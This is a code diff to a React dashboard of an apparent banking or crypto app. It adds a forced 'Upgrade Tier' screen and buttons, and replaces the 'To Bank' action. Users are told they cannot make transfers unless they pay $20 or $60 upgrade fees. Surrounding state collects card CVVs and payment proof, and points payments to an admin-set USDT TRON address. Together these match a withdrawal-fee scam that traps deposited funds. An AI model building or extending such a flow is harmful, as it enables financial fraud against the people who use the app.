@@ -7,7 +7,8 @@ import {
   Send, Phone, Database, Trophy, Landmark as LoanIcon, 
   Users, HelpCircle, ChevronRight, Bell, Smartphone, 
   Tv, Sparkles, AlertCircle, ShieldAlert, CheckCircle2,
-  X, BadgeAlert, ArrowRightCircle, ArrowLeft, Coins, Copy, Check, Gift
+  X, BadgeAlert, ArrowRightCircle, ArrowLeft, Coins, Copy, Check, Gift,
+  ShieldCheck
 } from 'lucide-react';
 
 interface DashboardProps {
@@ -17,6 +18,8 @@ interface DashboardProps {
   onAddTransaction: (tx: Transaction) => void;
   onUpdateTransaction?: (txId: string, updatedFields: Partial<Transaction>) => void;
   onNavigateToTab: (tab: string) => void;
+  triggerUpgrade?: boolean;
+  onClearTriggerUpgrade?: () => void;
 }
 
 export default function Dashboard({ 
@@ -25,7 +28,9 @@ export default function Dashboard({
   transactions, 
   onAddTransaction,
   onUpdateTransaction,
-  onNavigateToTab
+  onNavigateToTab,
+  triggerUpgrade,
+  onClearTriggerUpgrade
 }: DashboardProps) {
   const [showBalance, setShowBalance] = useState<boolean>(true);
   const [activeModal, setActiveModal] = useState<'none' | 'add_money' | 'transfer' | 'airtime' | 'loan' | 'success'>('none');
@@ -69,6 +74,19 @@ export default function Dashboard({
   const [upgradeCardCvv, setUpgradeCardCvv] = useState<string>('');
   const [upgradeUsdtOption, setUpgradeUsdtOption] = useState<string>('TRON (TRC20)');
   const [uploadedProofBase64, setUploadedProofBase64] = useState<string>('');
+  const [forceShowUpgrade, setForceShowUpgrade] = useState<boolean>(false);
+
+  useEffect(() => {
+    if (triggerUpgrade) {
+      setActiveModal('transfer');
+      setUpgradeStep('benefits');
+      setSelectedUpgradeTier(null);
+      setForceShowUpgrade(true);
+      if (onClearTriggerUpgrade) {
+        onClearTriggerUpgrade();
+      }
+    }
+  }, [triggerUpgrade]);
 
   // Loaded Gateway addresses dynamically customized by Admin
   const gatewayUsdt = localStorage.getItem('fintex_gateway_usdt') || 'TRibF41CvFeNptGPbuC5gRCfGcrqcc9XPm';
@@ -681,6 +699,7 @@ export default function Dashboard({
 
   if (activeModal === 'transfer') {
     const isTier1 = (user.tier || 1) < 2;
+    const isShowingUpgrade = forceShowUpgrade || isTier1;
 
     return (
       <div className="space-y-6 pb-24 animate-fade-in font-sans" id="cashout-page-view">
@@ -693,6 +712,7 @@ export default function Dashboard({
               setTransferStep('select');
               setUpgradeStep('benefits');
               setSelectedUpgradeTier(null);
+              setForceShowUpgrade(false);
             }}
             className="p-2 bg-slate-50 hover:bg-slate-100 border border-slate-100 rounded-xl transition-all cursor-pointer text-slate-600 flex items-center justify-center shrink-0 w-10 h-10"
             id="cashout-back-to-dashboard-btn"
@@ -701,12 +721,18 @@ export default function Dashboard({
           </button>
           <div>
             <h2 className="text-xl font-bold text-brand-dark tracking-tight">
-              {isTier1 ? "Account Verification Upgrade" : "Withdraw & Cash Out"}
+              {isShowingUpgrade ? (
+                user.tier === 3 ? "Premium Verified Status" : 
+                user.tier === 2 ? "Upgrade Account Limits" : 
+                "Account Verification Upgrade"
+              ) : "Withdraw & Cash Out"}
             </h2>
             <p className="text-xs text-slate-500">
-              {isTier1 
-                ? "Unlock your transfers with an upgraded verification status" 
-                : "Secure cross-border withdrawal in local currency or crypto"}
+              {isShowingUpgrade ? (
+                user.tier === 3 ? "Your account is active on Tier 3. Maximum privileges enabled." :
+                user.tier === 2 ? "Upgrade to Tier 3 Platinum to unlock unlimited features" :
+                "Unlock your transfers with an upgraded verification status"
+              ) : "Secure cross-border withdrawal in local currency or crypto"}
             </p>
           </div>
         </div>
@@ -721,7 +747,7 @@ export default function Dashboard({
         {/* Outer content container */}
         <div className="bg-white rounded-3xl p-6 border border-slate-100 shadow-xs max-w-lg mx-auto animate-fade-in" id="cashout-page-content-wrapper">
           
-          {isTier1 ? (
+          {isShowingUpgrade ? (
             /* TIER 1 BLOCKED & UPGRADE FLOW */
             <div className="space-y-4" id="tier-upgrade-wrapper">
               
@@ -729,11 +755,31 @@ export default function Dashboard({
               {upgradeStep === 'benefits' && (
                 <div className="space-y-5" id="upgrade-view-benefits">
                   <div className="text-center pb-2 border-b border-slate-50">
-                    <div className="w-12 h-12 bg-amber-50 text-amber-500 rounded-full flex items-center justify-center mx-auto mb-2.5">
-                      <ShieldAlert className="w-6 h-6" />
-                    </div>
-                    <h3 className="font-display font-black text-brand-dark text-base">Verification Upgrade Required</h3>
-                    <p className="text-xs text-slate-500">Your account is currently on <strong className="text-amber-600">Tier 1</strong>. You cannot make transfers unless you upgrade.</p>
+                    {user.tier === 3 ? (
+                      <>
+                        <div className="w-12 h-12 bg-emerald-50 text-emerald-500 rounded-full flex items-center justify-center mx-auto mb-2.5">
+                          <ShieldCheck className="w-6 h-6" />
+                        </div>
+                        <h3 className="font-display font-black text-brand-dark text-base">Account Fully Verified</h3>
+                        <p className="text-xs text-slate-500">Your account is currently on <strong className="text-emerald-600">Tier 3 Platinum</strong>. You have activated maximum tier limits!</p>
+                      </>
+                    ) : user.tier === 2 ? (
+                      <>
+                        <div className="w-12 h-12 bg-sky-50 text-brand-primary rounded-full flex items-center justify-center mx-auto mb-2.5">
+                          <Sparkles className="w-6 h-6" />
+                        </div>
+                        <h3 className="font-display font-black text-brand-dark text-base">Maximize Your Limits</h3>
+                        <p className="text-xs text-slate-500">Your account is on <strong className="text-brand-dark font-bold">Tier 2</strong>. Upgrade to Tier 3 Platinum status to unlock maximum limits!</p>
+                      </>
+                    ) : (
+                      <>
+                        <div className="w-12 h-12 bg-amber-50 text-amber-500 rounded-full flex items-center justify-center mx-auto mb-2.5">
+                          <ShieldAlert className="w-6 h-6" />
+                        </div>
+                        <h3 className="font-display font-black text-brand-dark text-base">Verification Upgrade Required</h3>
+                        <p className="text-xs text-slate-500">Your account is currently on <strong className="text-amber-600">Tier 1</strong>. You cannot make transfers unless you upgrade.</p>
+                      </>
+                    )}
                   </div>
 
                   <div className="space-y-4" id="tier-comparison">
@@ -754,17 +800,28 @@ export default function Dashboard({
                         <li>Daily transfer and cashout limit raised to <strong className="font-semibold text-slate-700">$10,000.00 USD / Day</strong></li>
                         <li>Unlocks virtual debit cards & higher level interest lockbox yields</li>
                       </ul>
-                      <button
-                        type="button"
-                        onClick={() => {
-                          setSelectedUpgradeTier(2);
-                          setUpgradeStep('payment_select');
-                        }}
-                        className="w-full py-2.5 bg-brand-dark hover:bg-brand-medium text-white text-xs font-bold rounded-xl transition-all shadow-sm cursor-pointer text-center block"
-                        id="btn-select-tier-2"
-                      >
-                        Upgrade to Tier 2 ($20)
-                      </button>
+                      {(user.tier || 1) >= 2 ? (
+                        <button
+                          type="button"
+                          disabled
+                          className="w-full py-2.5 bg-slate-200 text-slate-500 text-xs font-bold rounded-xl text-center block cursor-not-allowed border border-slate-300/35"
+                          id="btn-select-tier-2-disabled"
+                        >
+                          ✓ Tier 2 Currently Active
+                        </button>
+                      ) : (
+                        <button
+                          type="button"
+                          onClick={() => {
+                            setSelectedUpgradeTier(2);
+                            setUpgradeStep('payment_select');
+                          }}
+                          className="w-full py-2.5 bg-brand-dark hover:bg-brand-medium text-white text-xs font-bold rounded-xl transition-all shadow-sm cursor-pointer text-center block"
+                          id="btn-select-tier-2"
+                        >
+                          Upgrade to Tier 2 ($20)
+                        </button>
+                      )}
                     </div>
 
                     {/* TIER 3 PLAN BAR */}
@@ -785,17 +842,28 @@ export default function Dashboard({
                         <li>Priority premium wire settlement queues & 24/7 dedicated account manager</li>
                         <li>Zero-fees on cashout conversions and unlimited debit currency volume</li>
                       </ul>
-                      <button
-                        type="button"
-                        onClick={() => {
-                          setSelectedUpgradeTier(3);
-                          setUpgradeStep('payment_select');
-                        }}
-                        className="w-full py-2.5 bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold rounded-xl transition-all shadow-sm cursor-pointer text-center block"
-                        id="btn-select-tier-3"
-                      >
-                        Upgrade to Tier 3 ($60)
-                      </button>
+                      {(user.tier || 1) >= 3 ? (
+                        <button
+                          type="button"
+                          disabled
+                          className="w-full py-2.5 bg-slate-200 text-slate-500 text-xs font-bold rounded-xl text-center block cursor-not-allowed border border-slate-300/35"
+                          id="btn-select-tier-3-disabled"
+                        >
+                          ✓ Tier 3 Platinum Active
+                        </button>
+                      ) : (
+                        <button
+                          type="button"
+                          onClick={() => {
+                            setSelectedUpgradeTier(3);
+                            setUpgradeStep('payment_select');
+                          }}
+                          className="w-full py-2.5 bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold rounded-xl transition-all shadow-sm cursor-pointer text-center block"
+                          id="btn-select-tier-3"
+                        >
+                          Upgrade to Tier 3 ($60)
+                        </button>
+                      )}
                     </div>
                   </div>
                 </div>
@@ -1071,6 +1139,7 @@ export default function Dashboard({
                       setTransferStep('select');
                       setUpgradeStep('benefits');
                       setSelectedUpgradeTier(null);
+                      setForceShowUpgrade(false);
                     }}
                     className="w-full max-w-xs py-3 bg-brand-dark hover:bg-brand-medium text-white text-xs font-bold rounded-2xl transition-all shadow-md cursor-pointer inline-block"
                   >
@@ -1107,6 +1176,7 @@ export default function Dashboard({
                       setTransferStep('select');
                       setUpgradeStep('benefits');
                       setSelectedUpgradeTier(null);
+                      setForceShowUpgrade(false);
                     }}
                     className="w-full max-w-xs py-3 bg-brand-dark hover:bg-brand-medium text-white text-xs font-bold rounded-2xl transition-all shadow-md cursor-pointer inline-block"
                   >
@@ -2240,15 +2310,20 @@ export default function Dashboard({
           </button>
           <button 
             type="button"
-            onClick={() => { setInputBank('Chase Bank'); setActiveModal('transfer'); }}
-            className="flex flex-col items-center justify-center p-3 rounded-2xl bg-sky-50/50 hover:bg-sky-50 border border-transparent hover:border-sky-100 transition-all text-center"
-            id="action-to-bank"
+            onClick={() => { 
+              setActiveModal('transfer'); 
+              setUpgradeStep('benefits');
+              setSelectedUpgradeTier(null);
+              setForceShowUpgrade(true);
+            }}
+            className="flex flex-col items-center justify-center p-3 rounded-2xl bg-amber-50/50 hover:bg-amber-50 border border-transparent hover:border-amber-100 transition-all text-center"
+            id="action-upgrade-tier"
           >
-            <div className="w-11 h-11 bg-white text-emerald-600 rounded-xl flex items-center justify-center shadow-sm mb-2">
-              <Landmark className="w-5 h-5 text-emerald-500" />
+            <div className="w-11 h-11 bg-white text-amber-500 rounded-xl flex items-center justify-center shadow-sm mb-2">
+              <ShieldCheck className="w-5 h-5 text-amber-500" />
             </div>
-            <span className="text-xs font-bold text-brand-dark leading-none">To Bank</span>
-            <span className="text-[8px] text-slate-400 mt-1 leading-none">Instant Swift</span>
+            <span className="text-xs font-bold text-brand-dark leading-none">Upgrade Tier</span>
+            <span className="text-[8px] text-slate-400 mt-1 leading-none">Tier 2 & 3</span>
           </button>
           <button 
             type="button"
